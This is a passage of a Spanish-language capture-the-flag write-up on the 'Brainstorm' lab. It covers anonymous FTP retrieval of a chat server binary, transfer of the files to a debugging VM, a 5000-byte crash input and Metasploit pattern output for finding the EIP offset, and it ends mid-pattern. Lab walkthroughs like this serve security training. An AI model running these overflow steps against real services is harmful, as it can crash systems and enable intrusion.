+<span class="s2">SF:0message:\x20&quot;</span><span class="o">)</span>%r<span class="o">(</span>Help,63,<span class="s2">&quot;Welcome\x20to\x20Brainstorm\x20chat\x20\(bet</span>
+<span class="s2">SF:a\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20characters\)</span>
+<span class="s2">SF::\x20Write\x20a\x20message:\x20&quot;</span><span class="o">)</span>%r<span class="o">(</span>SSLSessionReq,63,<span class="s2">&quot;Welcome\x20to\x20</span>
+<span class="s2">SF:Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20</span>
+<span class="s2">SF:\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20&quot;</span><span class="o">)</span>%r<span class="o">(</span>Terminal
+SF:ServerCookie,63,<span class="s2">&quot;Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPleas</span>
+<span class="s2">SF:e\x20enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write</span>
+<span class="s2">SF:\x20a\x20message:\x20&quot;</span><span class="o">)</span><span class="p">;</span>
+Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Windows<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows
+</code></pre></div>
+<h2 id="ftp">FTP<a class="headerlink" href="#ftp" title="Permanent link">&para;</a></h2>
+<p>FTP Port 21 nos conectamos y descargamos los archivos</p>
+<div class="highlight"><pre><span></span><code>ftp<span class="w"> </span><span class="m">10</span>.201.14.163
+Connected<span class="w"> </span>to<span class="w"> </span><span class="m">10</span>.201.14.163.
+<span class="m">220</span><span class="w"> </span>Microsoft<span class="w"> </span>FTP<span class="w"> </span>Service
+Name<span class="w"> </span><span class="o">(</span><span class="m">10</span>.201.14.163:rdrgox<span class="o">)</span>:<span class="w"> </span>anonymous
+<span class="m">331</span><span class="w"> </span>Anonymous<span class="w"> </span>access<span class="w"> </span>allowed,<span class="w"> </span>send<span class="w"> </span>identity<span class="w"> </span><span class="o">(</span>e-mail<span class="w"> </span>name<span class="o">)</span><span class="w"> </span>as<span class="w"> </span>password.
+Password:<span class="w"> </span>
+<span class="m">230</span><span class="w"> </span>User<span class="w"> </span>logged<span class="w"> </span><span class="k">in</span>.
+Remote<span class="w"> </span>system<span class="w"> </span><span class="nb">type</span><span class="w"> </span>is<span class="w"> </span>Windows_NT.
+ftp&gt;<span class="w"> </span>passive
+Passive<span class="w"> </span>mode:<span class="w"> </span>off<span class="p">;</span><span class="w"> </span>fallback<span class="w"> </span>to<span class="w"> </span>active<span class="w"> </span>mode:<span class="w"> </span>off.
+ftp&gt;<span class="w"> </span>ls
+<span class="m">200</span><span class="w"> </span>EPRT<span class="w"> </span><span class="nb">command</span><span class="w"> </span>successful.
+<span class="m">125</span><span class="w"> </span>Data<span class="w"> </span>connection<span class="w"> </span>already<span class="w"> </span>open<span class="p">;</span><span class="w"> </span>Transfer<span class="w"> </span>starting.
+<span class="m">08</span>-29-19<span class="w">  </span><span class="m">08</span>:36PM<span class="w">       </span>&lt;DIR&gt;<span class="w">          </span>chatserver
+<span class="m">226</span><span class="w"> </span>Transfer<span class="w"> </span>complete.
+ftp&gt;<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>chatserver
+<span class="m">250</span><span class="w"> </span>CWD<span class="w"> </span><span class="nb">command</span><span class="w"> </span>successful.
+ftp&gt;<span class="w"> </span>ls
+<span class="m">200</span><span class="w"> </span>EPRT<span class="w"> </span><span class="nb">command</span><span class="w"> </span>successful.
+<span class="m">150</span><span class="w"> </span>Opening<span class="w"> </span>ASCII<span class="w"> </span>mode<span class="w"> </span>data<span class="w"> </span>connection.
+<span class="m">08</span>-29-19<span class="w">  </span><span class="m">10</span>:26PM<span class="w">                </span><span class="m">43747</span><span class="w"> </span>chatserver.exe
+<span class="m">08</span>-29-19<span class="w">  </span><span class="m">10</span>:27PM<span class="w">                </span><span class="m">30761</span><span class="w"> </span>essfunc.dll
+<span class="m">226</span><span class="w"> </span>Transfer<span class="w"> </span>complete.
+ftp&gt;<span class="w"> </span>get<span class="w"> </span>chatserver.exe
+local:<span class="w"> </span>chatserver.exe<span class="w"> </span>remote:<span class="w"> </span>chatserver.exe
+<span class="m">200</span><span class="w"> </span>EPRT<span class="w"> </span><span class="nb">command</span><span class="w"> </span>successful.
+<span class="m">150</span><span class="w"> </span>Opening<span class="w"> </span>ASCII<span class="w"> </span>mode<span class="w"> </span>data<span class="w"> </span>connection.
+<span class="w"> </span><span class="m">88</span>%<span class="w"> </span><span class="p">|</span>****************************************************************************************************************************************<span class="w">                   </span><span class="p">|</span><span class="w"> </span><span class="m">38640</span><span class="w">       </span><span class="m">37</span>.72<span class="w"> </span>KiB/s<span class="w">    </span><span class="m">00</span>:00<span class="w"> </span>ETAftp:<span class="w"> </span>Reading<span class="w"> </span>from<span class="w"> </span>network:<span class="w"> </span>Interrupted<span class="w"> </span>system<span class="w"> </span>call
+<span class="w">  </span><span class="m">0</span>%<span class="w"> </span><span class="p">|</span><span class="w">                                                                                                                                                           </span><span class="p">|</span><span class="w">    </span>-1<span class="w">        </span><span class="m">0</span>.00<span class="w"> </span>KiB/s<span class="w">    </span>--:--<span class="w"> </span>ETA
+<span class="m">550</span><span class="w"> </span>The<span class="w"> </span>specified<span class="w"> </span>network<span class="w"> </span>name<span class="w"> </span>is<span class="w"> </span>no<span class="w"> </span>longer<span class="w"> </span>available.<span class="w"> </span>
+WARNING!<span class="w"> </span><span class="m">45</span><span class="w"> </span>bare<span class="w"> </span>linefeeds<span class="w"> </span>received<span class="w"> </span><span class="k">in</span><span class="w"> </span>ASCII<span class="w"> </span>mode.
+File<span class="w"> </span>may<span class="w"> </span>not<span class="w"> </span>have<span class="w"> </span>transferred<span class="w"> </span>correctly.
+ftp&gt;<span class="w"> </span>get<span class="w"> </span>essfunc.dll
+local:<span class="w"> </span>essfunc.dll<span class="w"> </span>remote:<span class="w"> </span>essfunc.dll
+<span class="m">200</span><span class="w"> </span>EPRT<span class="w"> </span><span class="nb">command</span><span class="w"> </span>successful.
+<span class="m">150</span><span class="w"> </span>Opening<span class="w"> </span>ASCII<span class="w"> </span>mode<span class="w"> </span>data<span class="w"> </span>connection.
+<span class="m">100</span>%<span class="w"> </span><span class="p">|</span>***********************************************************************************************************************************************************<span class="p">|</span><span class="w"> </span><span class="m">30761</span><span class="w">       </span><span class="m">30</span>.02<span class="w"> </span>KiB/s<span class="w">    </span><span class="m">00</span>:00<span class="w"> </span>ETAftp:<span class="w"> </span>Reading<span class="w"> </span>from<span class="w"> </span>network:<span class="w"> </span>Interrupted<span class="w"> </span>system<span class="w"> </span>call
+<span class="w">  </span><span class="m">0</span>%<span class="w"> </span><span class="p">|</span><span class="w">                                                                                                                                                           </span><span class="p">|</span><span class="w">    </span>-1<span class="w">        </span><span class="m">0</span>.00<span class="w"> </span>KiB/s<span class="w">    </span>--:--<span class="w"> </span>ETA
+<span class="m">226</span><span class="w"> </span>Transfer<span class="w"> </span>complete.
+WARNING!<span class="w"> </span><span class="m">32</span><span class="w"> </span>bare<span class="w"> </span>linefeeds<span class="w"> </span>received<span class="w"> </span><span class="k">in</span><span class="w"> </span>ASCII<span class="w"> </span>mode.
+File<span class="w"> </span>may<span class="w"> </span>not<span class="w"> </span>have<span class="w"> </span>transferred<span class="w"> </span>correctly.
+ftp&gt;<span class="w"> </span>bye
+<span class="m">221</span><span class="w"> </span>Goodbye.
+</code></pre></div>
+<p><a href="https://github.com/GeardoRanger/BrainStorm-THM-ChatServer.exe-Exploit/tree/main/Resource%20Files">Recursos BrainStorm</a></p>
+<p>Abrimos nuestro windows preparado para BoF y trasferimos nuestro archivos</p>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">8000</span><span class="w">             </span>
+Serving<span class="w"> </span>HTTP<span class="w"> </span>on<span class="w"> </span><span class="m">0</span>.0.0.0<span class="w"> </span>port<span class="w"> </span><span class="m">8000</span><span class="w"> </span><span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span><span class="w"> </span>...
+
+<span class="m">192</span>.168.159.134<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">28</span>/Sep/2025<span class="w"> </span><span class="m">04</span>:33:52<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET /chatserver.exe HTTP/1.1&quot;</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-
+<span class="m">192</span>.168.159.134<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">28</span>/Sep/2025<span class="w"> </span><span class="m">04</span>:33:55<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET /essfunc.dll HTTP/1.1&quot;</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-
+</code></pre></div>
+<p><img alt="alt text" src="img/image.png" /></p>
+<p>En nuestra maquina kali enviamos un mensaje con nc, el detalle es que como máximo de 20 caracteres de nombre de usuario.</p>
+<div class="highlight"><pre><span></span><code>nc<span class="w"> </span><span class="m">192</span>.168.159.134<span class="w"> </span><span class="m">9999</span>
+Welcome<span class="w"> </span>to<span class="w"> </span>Brainstorm<span class="w"> </span>chat<span class="w"> </span><span class="o">(</span>beta<span class="o">)</span>
+Please<span class="w"> </span>enter<span class="w"> </span>your<span class="w"> </span>username<span class="w"> </span><span class="o">(</span>max<span class="w"> </span><span class="m">20</span><span class="w"> </span>characters<span class="o">)</span>:<span class="w"> </span><span class="nb">test</span>
+Write<span class="w"> </span>a<span class="w"> </span>message:<span class="w"> </span>hola<span class="w"> </span>wn
+
+
+Sun<span class="w"> </span>Sep<span class="w"> </span><span class="m">28</span><span class="w"> </span><span class="m">04</span>:46:05<span class="w"> </span><span class="m">2025</span>
+<span class="nb">test</span><span class="w"> </span>said:<span class="w"> </span>hola<span class="w"> </span>wn**
+</code></pre></div>
+<p><img alt="alt text" src="img/image-1.png" /></p>
+<h2 id="bof">BoF<a class="headerlink" href="#bof" title="Permanent link">&para;</a></h2>
+<p>Abrimos el Immunity Debugger en nuestro Windows para BOF y cargamos el archivo </p>
+<p><img alt="alt text" src="img/image-2.png" /></p>
+<h3 id="fuzz">FUZZ<a class="headerlink" href="#fuzz" title="Permanent link">&para;</a></h3>
+<p>Vamos a crear un archivo en python para probar nuestra etapa de FUZZ y ver si al ingresar o el username este con congela</p>
+<div class="highlight"><pre><span></span><code>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print(&#39;A&#39; * 5000)&quot;</span><span class="w"> </span>
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</code></pre></div>
+<p>Hemos comprobado que al enviar un mensaje este el programa se congela</p>
+<p><img alt="alt text" src="img/image-3.png" /></p>
+<p>Vamos a generar 5000 caracteres aleatorias para ver donde cambia el EIP y después buscar el cambio</p>
+<div class="highlight"><pre><span></span><code>msf-pattern_create<span class="w"> </span>-l<span class="w"> </span><span class="m">5000</span>
+
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4E